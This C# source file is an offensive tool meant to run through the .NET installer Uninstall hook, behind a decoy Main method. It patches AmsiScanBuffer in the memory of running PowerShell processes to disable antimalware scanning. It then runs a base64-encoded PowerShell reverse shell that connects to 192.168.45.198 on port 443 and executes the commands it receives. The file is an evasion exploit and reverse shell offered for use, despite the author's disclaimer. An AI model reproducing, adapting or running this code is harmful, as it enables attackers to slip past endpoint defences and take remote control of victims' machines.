using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace FullBypassInstaller
{
    internal class InstallerShell
    {
       
        static void Main(string[] args)
        {
            Console.WriteLine("This is a main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint floldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
           

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            Console.WriteLine(BypassAMSI());

            string revShellcommand = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=";


            ps.AddScript(revShellcommand);
            ps.Invoke();
            rs.Close();
        }

        private static int BypassAMSI()
        {

            Console.WriteLine("Author: Shelldon");
            Console.WriteLine("github: github.com/Sh3lldon");
            Console.WriteLine("!!!! Please do not use in unethical hacking and follow all rules and regulations of laws!!!!");

            Process[] processes = Process.GetProcessesByName("powershell");
            if (processes.Length != 0)
            {
                Console.WriteLine("[+] Found " + processes.Length + " powershell processes\n");
            }
            else
            {
                Console.WriteLine("[-] Powershell process does not exist");
                Console.WriteLine("Please create powershell process");
                System.Environment.Exit(1);
            }

            int id = 0;
            bool res = false;
            for (int l = 0; l < processes.Length; l++)
            {

                id++;
                Console.WriteLine("#" + id);
                IntPtr hHandle = OpenProcess(0x001F0FFF, false, processes[l].Id);
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr amsiScanBuffer = IntPtr.Zero;
                int moduleSize = 0;


                Console.WriteLine("[+] Powershell process id: " + processes[l].Id + " & handle: " + hHandle);
                foreach (ProcessModule processModule in processes[l].Modules)
                {
                    if (processModule.ModuleName == "amsi.dll")
                    {
                        Console.WriteLine("[+] Base address of amsi.dll: " + "0x" + processModule.BaseAddress.ToString("X"));
                        baseAddress = processModule.BaseAddress;
                        moduleSize = processModule.ModuleMemorySize;
                        Console.WriteLine("[+] Size of the module: 0x" + moduleSize.ToString("X"));
                    }
                }

                byte[] ret = new byte[32];
                // First 32 bytes of AmsiScanBuffer function
                byte[] fewBytes = new byte[32] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x49, 0x89, 0x6b, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70, 0x4d, 0x8b, 0xf9, 0x41, 0x8b, 0xf8, 0x48, 0x8b };
                IntPtr outt;
                bool addrScanBuffer = false;
                int count = 0;

                for (int i = 0; i <= moduleSize; i += fewBytes.Length)
                {
                    ReadProcessMemory(hHandle, baseAddress + i, ret, fewBytes.Length, out outt);
                    if (addrScanBuffer == true)
                    {
                        break;
                    }
                    for (int j = 0; j < fewBytes.Length; j++)
                    {
                        if (count == fewBytes.Length - 1)
                        {
                            amsiScanBuffer = baseAddress + i;
                            Console.WriteLine("[+] Found AmsiScanBuffer function: 0x" + amsiScanBuffer.ToString("X"));
                            res = false;
                            addrScanBuffer = true;
                            break;
                        }
                        if (fewBytes[j] == ret[j])
                        {
                            count++;
                        }
                        else if (fewBytes[j] != ret[j])
                        {
                            count = 0;
                            break;
                        }
                    }
                }
                if (count != fewBytes.Length - 1)
                {
                    Console.WriteLine("[-] Cannot find need bytes of AmsiScanBuffer function");
                    Console.WriteLine("Maybe you have already hijacked memory :)\n----------------------------------------------------------\n");
                    res = true;
                }
                if (res)
                {
                    continue;
                }

                uint lpflOldProtect;
                if (VirtualProtectEx(hHandle, baseAddress, (uint)0x1000, 0x40, out lpflOldProtect))
                {
                    Console.WriteLine("[+] Successfully changed memory protection");
                }
                else
                {
                    Console.WriteLine("[-] Changing memory protection failed");
                }

                byte[] hijack = new byte[3] { 0x31, 0xff, 0x90 };
                int numberOfBytesWritten = 0;
                if (WriteProcessMemory(hHandle, amsiScanBuffer + 0x1b, hijack, (uint)hijack.Length, out numberOfBytesWritten))
                {
                    Console.WriteLine("[+] Successfully hijacked\n----------------------------------------------------------\n");
                }
                else
                {
                    Console.WriteLine("[-] Hijacking failed\n----------------------------------------------------------\n");
                }

            }


            return 0;
        }
    }
    
}